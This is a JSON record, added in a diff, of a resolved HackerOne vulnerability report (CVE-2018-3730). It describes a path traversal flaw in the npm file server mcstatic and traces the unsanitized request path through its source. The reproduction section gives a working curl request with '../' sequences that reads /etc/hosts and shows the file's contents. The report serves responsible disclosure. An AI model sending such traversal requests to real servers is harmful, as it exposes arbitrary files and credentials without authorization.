@@ -1,0 +1,133 @@
+{
+  "id": 312907,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTI5MDc=",
+  "url": "https://hackerone.com/reports/312907",
+  "title": "[mcstatic] Path Traversal allows to read content of arbitrary files",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-06T15:43:16.553Z",
+  "submitted_at": "2018-02-06T15:43:16.553Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3730"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-04-24T19:46:53.316Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-04-24T19:46:28.328Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal in mcstatic module.\nIt allows to read content of arbitrary files on the remote server.\n\n## Module\n\n**mcstatic**\n\nThis is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.\n\nhttps://www.npmjs.com/package/mcstatic\n\nversion: 0.0.20\n\nStats\n0 downloads in the last day\n38 downloads in the last week\n150 downloads in the last month\n\n~1800 estimated downloads per year\n\n\n## Description\n\nLack of file path sanitization causes that any file on the server might be read by malicious user.\n\nIf we follow code flow, we find that first file name is read from ```req.url``` and check if exists:\n\n```javascript\n// node_modules/mcstatic/lib/staticFileHandler.js, line 19:\n    var filePath = httpHelpers.getRequestPathFromUrl(req.url);\n    var mockedFilePath = findMockFilePath(filePath,mockPaths);\n    if(mockedFilePath)\n        filePath = mockedFilePath;\n\n    var file = path.normalize(path.join(root,filePath));\n    fs.stat(file,function(error, stats){\n        if(error)\n            return statusHandlers[500](res, nextHandler, { error: error });\n```\n\nDepends on HTTP method used, handler function is called (here's for GET):\n\n```javascript\n// node_modules/mcstatic/lib/staticFileHandler.js, line 39:\nif (req.method === 'GET')\n        return responseHandlers.handleGet(res,file, stats, nextHandler);\n```\n\n```handleGet``` maps to ```streamResponse``` in ```responseHanders.js```:\n\n```javascript\n// node_modules/mcstatic/lib/responseHandlers.js, line 22:\nvar streamResponse = function(res, file, stat, next){\n    var stream = fs.createReadStream(file);\n    res.setHeader('content-length', stat.size);\n\n    stream.pipe(res);\n    stream.on('error', function (err) {\n        statusHandlers['500'](res, next, { error: err });\n    });\n\n    stream.on('end', function () {\n        res.statusCode = 200;\n        res.end();\n    });\n};\n```\n\nWe can see (line 23) that ```stream``` is created directly from ```file``` and piped to ```res``` response object.\n\n\n## Steps To Reproduce:\n\n\n- install ```mcstatic```:\n\n```\n$ npm install mcstatic\n```\n\n- run ```mcstatic``` in direcotry of your choice:\n\n```\nme:~/playground/hackerone/Node$ ./node_modules/mcstatic/bin/mcstatic \nmcstatic serving ./ on port 8080\n```\n\n- execute following ```curl``` command (adjust number of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts\n```\n\n- see result:\n\n```\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../../etc/hosts HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< last-modified: Tue, 23 Jan 2018 14:51:52 GMT\n< content-length: 188\n< content-type: application/octet-stream\n< Date: Tue, 06 Feb 2018 15:40:51 GMT\n< Connection: keep-alive\n< \n127.0.0.1\tlocalhost\n127.0.1.1\tLT0081U2\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n* Connection #0 to host 127.0.0.1 left intact\n```\n\n## Supporting Material/References:\n\n\n- Ubuntu 16.04 LTS\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.4 LTS\n- npm version: 5.6.0\n- curl 7.47.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows to read content of any file on the server where module is run.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-05-24T19:46:28.401Z",
+  "allow_singular_disclosure_after": -251149078.4321296,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "eveeez",
+    "khizer47",
+    "grampae",
+    "japz",
+    "martijn",
+    "kalkshshhsndnd"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5909,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "mcstatic",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
